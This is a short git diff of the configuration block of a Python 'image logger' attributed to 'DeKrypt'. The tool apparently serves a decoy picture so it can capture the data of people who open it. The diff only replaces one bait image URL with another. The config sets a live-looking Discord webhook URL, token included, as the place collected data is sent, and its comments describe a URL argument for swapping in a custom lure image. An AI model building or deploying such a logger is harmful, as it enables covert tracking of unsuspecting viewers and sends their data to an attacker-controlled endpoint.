@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1126535020115411018/IJSjpnZC3e50T2msIzvh7PDCUC1NsC2yQX6YS-e2n3NoJDEHvtVt13yoJwMOVcIQ5GLp",
-    "image": "https://www.mashed.com/img/gallery/what-does-it-mean-to-get-a-hot-dog-alligator-style/l-intro-1672777527.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://th.bing.com/th/id/OIP.b8U1fXL9b2ts3V_Wdk8HZAHaEK?pid=ImgDet&rs=1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
